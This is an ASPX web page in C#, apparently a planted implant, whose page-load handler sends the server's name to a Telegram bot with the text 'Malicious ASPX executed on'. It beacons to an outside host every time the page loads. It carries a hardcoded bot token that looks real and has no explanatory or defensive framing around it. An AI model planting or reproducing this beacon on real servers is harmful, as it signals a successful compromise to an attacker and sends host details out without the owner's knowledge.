<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string botToken = "8128117790:AAHhKWnFTuk4DIeFsl1xyBiUsYxovpzm-_w";
        string chatId = "YOUR_CHAT_ID"; // Replace with your actual Telegram chat ID
        string message = "Malicious ASPX executed on: " + Request.ServerVariables["SERVER_NAME"];

        string url = $"https://api.telegram.org/bot{botToken}/sendMessage?chat_id={chatId}&text={message}";

        try
        {
            WebRequest request = WebRequest.Create(url);
            request.Method = "GET";
            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            {
                using (StreamReader reader = new StreamReader(response.GetResponseStream()))
                {
                    // Read response (if necessary)
                    string responseText = reader.ReadToEnd();
                }
            }
        }
        catch (Exception ex)
        {
            // Log exception (if necessary)
        }
    }
</script>
